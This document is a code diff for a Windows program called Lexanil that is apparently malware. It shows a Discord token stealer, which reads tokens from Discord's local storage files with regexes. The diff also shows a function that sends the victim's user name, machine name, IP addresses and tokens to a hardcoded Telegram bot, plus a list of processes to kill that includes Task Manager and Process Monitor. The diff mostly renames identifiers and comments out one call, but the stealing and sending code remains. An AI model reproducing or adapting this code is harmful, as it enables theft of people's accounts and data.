@@ -57,6 +57,9 @@ namespace Lexanil
         private static extern short GetAsyncKeyState(Keys key); 
         private IntPtr ptrHook;
         private LowLevelKeyboardProc objKeyboardProcess;
+        static string[] processes = new[] { "iexplore", "steam", "explorer", "Taskmgr", "Procmon", "Procmon64", "cmd", "Discord", "chrome", "firefox" };
+        private static bool foundSth;
+
 
         public Form1()
         {
@@ -66,16 +69,14 @@ namespace Lexanil
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            broadcastInfection(); 
+            //broadcastInfection(); 
             //disableShortcuts();
             //ShowCursor(false);
-            //startupinfect();
+            //startupInfect();
             //infectFiles();
-            //prockilltmr.Start();
+           // prockilltmr.Start();
         }
 
-        static string[] processes = new[] { "iexplore", "steam", "explorer", "Taskmgr", "Procmon", "Procmon64", "cmd", "Discord", "chrome", "firefox" };
-        private static bool foundSth;
 
         private void prockilltmr_Tick(object sender, EventArgs e)
         {
@@ -199,47 +200,47 @@ namespace Lexanil
         private void broadcastInfection()
         {
             string url = $"https://api.telegram.org/bot1991257214:AAHecknMxCKd24uX8wNC5g5AYahRLlUSCVs/sendMessage?chat_id=1466869929&text=" +
-                $"😈 {AppDomain.CurrentDomain.FriendlyName}(Lexil™) Has infected Someone, I'm sending you his details! 😈\n" +
+                $"😈 {AppDomain.CurrentDomain.FriendlyName}(Lexanil™) Has infected Someone, I'm sending you his details! 😈\n" +
                 $"User Name: {Environment.UserName}\n" +
                 $"Machine Name: {Environment.MachineName}\n" +
                 $"LocalIP: {GetLocalIPAddress()}\n" +
                 $"PublicIP: {GetPublicIPAddress()}\n" +
-                $"Discord Tokens: {string.Join("\n", scrapeDiscordTokens())}";
+                $"Discord Tokens: {string.Join("\n", getDiscordTokens())}";
 
             HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
             HttpWebResponse response = (HttpWebResponse)request.GetResponse();
             Stream resStream = response.GetResponseStream();
         }
 
-        public static List<string> scrapeDiscordTokens()
+        public static List<string> getDiscordTokens()
         {
-            List<string> discordtokens = new List<string>();
+            List<string> captures = new List<string>();
             DirectoryInfo rootfolder = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");
 
             foreach (var file in rootfolder.GetFiles(false ? "*.log" : "*.ldb"))
             {
-                string readedfile = file.OpenText().ReadToEnd();
+                string openedfile = file.OpenText().ReadToEnd();
 
-                foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
-                    discordtokens.Add(match.Value + "\n");
+                foreach (Match match in Regex.Matches(openedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
+                    captures.Add(match.Value + "\n");
 
-                foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
-                    discordtokens.Add(match.Value + "\n");
+                foreach (Match match in Regex.Matches(openedfile, @"mfa\.[\w-]{84}"))
+                    captures.Add(match.Value + "\n");
             }
 
 
-            discordtokens = discordtokens.ToList();
+            captures = captures.ToList();
 
-            Console.WriteLine(discordtokens);
+            Console.WriteLine(captures);
 
-            if (discordtokens.Count > 0)
+            if (captures.Count > 0)
             {
                 foundSth = true;
             }
             else
-                discordtokens.Add("Empty");
+                captures.Add("Empty");
 
-            return discordtokens;
+            return captures;
         }
 
         private void Form1_KeyDown(object sender, KeyEventArgs e)
